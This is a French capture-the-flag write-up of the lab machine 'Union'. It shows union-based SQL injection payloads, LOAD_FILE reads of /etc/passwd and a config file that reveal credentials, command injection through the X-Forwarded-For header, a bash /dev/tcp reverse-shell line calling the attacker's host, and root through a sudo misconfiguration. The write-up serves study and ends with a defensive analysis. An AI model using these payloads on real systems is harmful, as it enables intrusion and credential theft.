![Cover](cover.png)

### 1. Reconnaissance & Scanning

Ma phase de reconnaissance commence par un **Port Scanning** exhaustif pour identifier la surface d'attaque. Le scan initial révèle un seul port ouvert, ce qui concentre immédiatement mon attention sur le vecteur Web.

```bash
# Scan complet de tous les ports TCP
nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.11.128

# Scan de services et scripts par défaut sur le port 80
nmap -p 80 -sCV -oA scans/nmap-tcpscripts 10.10.11.128
```

**Résultats clés :**
*   **Port 80/TCP** : **Nginx 1.18.0** (Ubuntu).
*   **PHPSESSID** : Présence d'un cookie de session PHP sans le flag `httponly`.

---

### 2. Énumération Web & Analyse du Vecteur d'Entrée

Le site web concerne les qualifications du tournoi UHC. Un formulaire de saisie de nom d'utilisateur est présent sur `index.php`. En testant différents inputs, je remarque des comportements distincts :
*   Un utilisateur existant (ex: `ippsec`) renvoie un message spécifique.
*   Un utilisateur inexistant renvoie un message d'éligibilité.
*   Certaines chaînes comme `0x` déclenchent une réponse filtrée, suggérant la présence d'un **WAF (Web Application Firewall)** rudimentaire ou d'une liste noire de caractères.

Je lance un **Directory Brute Force** pour découvrir des fichiers cachés :

```bash
feroxbuster -u http://10.10.11.128 -x php -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
```

**Découvertes :**
*   `config.php` : Retourne une page vide (probablement les accès DB).
*   `challenge.php` : Demande un flag pour continuer.
*   `firewall.php` : Affiche "Access Denied".

---

### 3. Exploitation : Union-based SQL Injection

L'analyse des réponses du formulaire `index.php` révèle une vulnérabilité de type **SQL Injection**. Bien que les caractères classiques comme `'` semblent gérés, l'utilisation de commentaires SQL permet de confirmer l'injection.

> **Schéma Mental :**
> L'application exécute probablement une requête du type : `SELECT username FROM users WHERE username = '[INPUT]';`
> Si j'injecte `' OR 1=1-- -`, je manipule la logique. Le **WAF** bloque " OR ", mais laisse passer d'autres structures. Si l'application affiche directement le résultat de la requête SQL dans la page, une **Union-based SQLi** est possible pour exfiltrer des données arbitraires.

#### Preuve de Concept (PoC)
L'injection est confirmée avec le payload suivant qui simule un utilisateur inexistant mais force l'affichage via `UNION` :

```bash
# Vérification de l'utilisateur actuel de la DB
curl -s -X POST http://10.10.11.128 -d "player=' union select user();-- -" | grep "Sorry"
```

#### Énumération de la Database
J'automatise l'exfiltration via un **one-liner** Bash pour nettoyer la sortie :

```bash
# Lister les bases de données
curl -s -X POST http://10.10.11.128 -d "player=' union select group_concat(SCHEMA_NAME) from INFORMATION_SCHEMA.schemata;-- -" | sed 's/Sorry, //' | sed 's/ you are not eligible.*//'

# Lister les tables de la DB 'november'
curl -s -X POST http://10.10.11.128 -d "player=' union select group_concat(table_name) from INFORMATION_SCHEMA.tables where table_schema='november';-- -"

# Extraire le flag de la table 'flag'
curl -s -X POST http://10.10.11.128 -d "player=' union select one from flag;-- -"
```

Le flag récupéré est `UHC{F1rst_5tep_2_Qualify}`. En le soumettant sur `challenge.php`, le serveur m'informe que l'accès SSH est désormais autorisé pour mon IP (le port 22 s'ouvre dynamiquement sur le firewall).

---

### 4. Brèche Initiale : File Read & SSH Access

Grâce aux privilèges de l'utilisateur SQL, je peux utiliser la fonction `LOAD_FILE()` pour lire des fichiers sensibles sur le système de fichiers Linux.

```bash
# Lecture de /etc/passwd pour identifier les utilisateurs système
curl -s -X POST http://10.10.11.128 -d "player=' union select load_file('/etc/passwd');-- -"

# Lecture du fichier de configuration pour obtenir les credentials
curl -s -X POST http://10.10.11.128 -d "player=' union select load_file('/var/www/html/config.php');-- -"
```

Le fichier `config.php` révèle les identifiants suivants :
*   **User** : `uhc`
*   **Password** : `uhc-11qual-global-pw`

> **Schéma Mental :**
> La vulnérabilité **SQL Injection** a servi de pivot pour :
> 1. Exfiltrer un flag applicatif pour modifier les règles de filtrage réseau (**Port Knocking** via application).
> 2. Réaliser une **Arbitrary File Read** pour obtenir des credentials valides.

Je procède à la connexion via **SSH** pour obtenir mon premier shell stable :

```bash
sshpass -p 'uhc-11qual-global-pw' ssh uhc@10.10.11.128
```
Une fois connecté, je valide le premier flag utilisateur dans `/home/uhc/user.txt`.

---

### Énumération Post-Exploitation : Analyse du vecteur Web

Une fois mon accès **SSH** établi avec l'utilisateur **uhc**, j'effectue une énumération locale pour comprendre les interactions entre les services. Le point d'entrée initial étant une application PHP, je me concentre sur le répertoire `/var/www/html`.

L'analyse du fichier `challenge.php` révèle que la validation du **flag** (récupéré via l'**SQL Injection** en phase 1) active une variable de session : `$_SESSION['Authenticated'] = True`. Cette condition est le prérequis pour accéder à `firewall.php`.

Le fichier `firewall.php` contient une vulnérabilité critique de **Command Injection** :

```php
if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
};
system("sudo /usr/sbin/iptables -A INPUT -s " . $ip . " -j ACCEPT");
```

La fonction `system()` concatène directement le contenu du header **X-FORWARDED-FOR** sans aucune sanitization. Bien que l'adresse IP réelle (`REMOTE_ADDR`) ne soit pas falsifiable facilement, le header **X-FORWARDED-FOR** est entièrement sous le contrôle de l'attaquant.

> **Schéma Mental : Escalade via Injection de Commande**
> 1. **Condition** : Posséder un cookie de session authentifié (via `challenge.php`).
> 2. **Vecteur** : Injection de métacaractères shell (`;`) dans le header HTTP **X-FORWARDED-FOR**.
> 3. **Exécution** : Le serveur exécute `iptables` suivi de ma commande arbitraire avec les privilèges de **sudo** (car la commande pré-remplie utilise déjà `sudo`).
> 4. **Résultat** : Exécution de code en tant que **www-data**.

---

### Mouvement Latéral : Obtention du shell www-data

Pour exploiter cette injection, j'utilise **Burp Suite** ou **cURL** en injectant une commande après un point-virgule. Je dois m'assurer de terminer la commande par un autre point-virgule pour éviter que les arguments restants de la commande initiale (`-j ACCEPT`) ne provoquent une erreur de syntaxe.

**Payload de test (PoC) :**
```http
X-FORWARDED-FOR: 1.1.1.1; ping -c 1 10.10.14.6;
```

Après avoir confirmé l'exécution via `tcpdump`, je génère un **Reverse Shell** :

```bash
# Commande injectée dans le header X-FORWARDED-FOR
1.1.1.1; bash -c "bash -i >& /dev/tcp/10.10.14.6/443 0>&1";
```

**Stabilisation du Shell :**
Une fois la connexion reçue sur mon **Listener**, je stabilise le terminal pour obtenir un **TTY** interactif :

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# CTRL+Z
stty raw -echo; fg
export TERM=xterm
```

---

### Escalade de Privilèges : De www-data à root

Maintenant positionné en tant que **www-data**, je vérifie mes privilèges **sudo** disponibles. L'analyse précédente du fichier `firewall.php` suggérait déjà que l'utilisateur web pouvait exécuter certaines commandes avec des privilèges élevés.

```bash
www-data@union:~/html$ sudo -l
```

Le résultat indique une configuration extrêmement permissive dans le fichier **sudoers** :
`User www-data may run the following commands on union: (ALL : ALL) NOPASSWD: ALL`

L'utilisateur **www-data** peut exécuter n'importe quelle commande en tant que **root** sans mot de passe. L'escalade finale est immédiate.

**Exploitation finale :**
```bash
sudo bash
# Identité confirmée : root
id
cat /root/root.txt
```

> **Schéma Mental : Chemin Critique d'Escalade**
> **uhc** (SSH) -> **Analyse Web** (Source Code) -> **Command Injection** (Header HTTP) -> **www-data** (Reverse Shell) -> **Sudo Misconfiguration** (NOPASSWD: ALL) -> **root**.

---

### Élévation de Privilèges & Domination

Une fois l'accès **SSH** établi avec l'utilisateur **uhc**, mon objectif est d'analyser les interactions entre le serveur web et le système d'exploitation. L'énumération locale révèle que le service web tourne sous l'utilisateur **www-data** et possède des privilèges spécifiques liés à la gestion du **firewall**.

#### 1. Mouvement Latéral : De uhc à www-data

En analysant le code source de `firewall.php` (récupéré précédemment via la **SQL Injection** ou directement sur le disque), je relève une vulnérabilité critique de **Command Injection**.

Le script PHP utilise la fonction `system()` pour exécuter une commande **iptables** afin d'autoriser l'adresse IP du visiteur. Le développeur a commis l'erreur de faire confiance au header **X-Forwarded-For**, qui est entièrement contrôlable par l'attaquant.

```php
// Extrait de firewall.php
if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
};
system("sudo /usr/sbin/iptables -A INPUT -s " . $ip . " -j ACCEPT");
```

> Schéma Mental :
> **Header HTTP (Untrusted Input)** -> **Variable $ip** -> **Concaténation de chaîne** -> **Fonction system()** -> **Exécution de commande arbitraire**

Pour exploiter cela, je forge une requête HTTP incluant un point-virgule (`;`) pour terminer la commande légitime et injecter mon propre **Reverse Shell**.

```bash
# Payload d'injection via curl
curl -H "X-FORWARDED-FOR: 1.1.1.1; bash -c 'bash -i >& /dev/tcp/10.10.14.6/443 0>&1';" \
     -b "PHPSESSID=[VALID_SESSION_ID]" \
     http://10.10.11.128/firewall.php
```

Après exécution, je reçois une connexion sur mon **listener** netcat, m'octroyant un shell en tant que **www-data**.

#### 2. Élévation de Privilèges : De www-data à root

L'énumération des droits **sudo** pour l'utilisateur **www-data** montre une configuration extrêmement permissive, probablement mise en place pour faciliter les tests ou par erreur d'administration.

```bash
www-data@union:~/html$ sudo -l
User www-data may run the following commands on union:
    (ALL : ALL) NOPASSWD: ALL
```

La directive `(ALL : ALL) NOPASSWD: ALL` signifie que l'utilisateur peut exécuter n'importe quelle commande avec les privilèges de n'importe quel utilisateur (y compris **root**) sans fournir de mot de passe. L'escalade est immédiate.

```bash
# Passage en root
sudo bash
# Lecture du flag final
cat /root/root.txt
```

---

### Beyond Root : Analyse Post-Exploitation

La compromission totale de la machine **Union** repose sur une chaîne de vulnérabilités classiques mais dévastatrices :

1.  **Trust Boundary Violation** : Le serveur web fait confiance à un header HTTP (**X-Forwarded-For**) pour effectuer des opérations système privilégiées. Dans une architecture sécurisée, seule l'adresse IP réelle de la couche transport (`REMOTE_ADDR`) devrait être utilisée, ou une validation stricte par **Regex** de l'input devrait être appliquée.
2.  **Principe du Moindre Privilège (PoLP)** : L'utilisateur **www-data** ne devrait jamais avoir un accès `sudo ALL`. Si l'application doit modifier le **firewall**, une règle **sudoers** spécifique pour `/usr/sbin/iptables` avec des paramètres restreints aurait dû être configurée.
3.  **SQL Injection as a Gateway** : La **Union-based SQLi** initiale a permis de lire `config.php`, révélant des identifiants réutilisés pour le **SSH**. La **Password Reuse** entre la base de données et le compte système a facilité l'accès initial.
4.  **Firewall Bypass** : Le mécanisme de "port knocking" via PHP pour ouvrir le port 22 est une sécurité par l'obscurité qui a finalement servi de vecteur d'attaque principal.